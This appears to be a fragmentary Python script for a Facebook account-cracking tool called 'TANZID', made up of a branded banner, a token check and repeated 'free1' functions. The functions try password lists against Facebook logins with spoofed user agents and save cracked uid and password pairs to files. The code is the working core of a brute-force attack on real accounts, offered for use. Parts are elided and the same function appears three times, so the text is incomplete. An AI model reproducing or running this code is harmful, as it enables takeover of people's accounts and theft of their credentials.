...
logo =f"""{WHITE}
 ...
 ________  ______   __    __  ________  ______  _______  
/        |/      \ /  \  /  |/        |/      |/       \ 
$$$$$$$$//$$$$$$  |$$  \ $$ |$$$$$$$$/ $$$$$$/ $$$$$$$  |
   $$ |  $$ |__$$ |$$$  \$$ |    /$$/    $$ |  $$ |  $$ |
   $$ |  $$    $$ |$$$$  $$ |   /$$/     $$ |  $$ |  $$ |
...
â•‘ Creator  : TANZID                        â•‘
â•‘ Github   : https://github.com/Termux-Tanzid  â•‘
â•‘ Facebook : TANZID                          â•‘
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : TANZID KHAN ")
    print("\t  Fb page  : TANZIDS COMMUNITY ")
    print("\t  Github   : TANZID48")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=TANZID"
        print("\n\t     [ Hello User ]\n")
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[TANZID-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/TANZID-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[TANZID] '+uid+' [~] '+ps+' ')
                    open('/sdcard/TANZID.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[TANZID-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/TANZID-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[TANZID ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[TANZID ðŸ”¥] [%s] \33[1;97m[OK:%s{TANZID2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
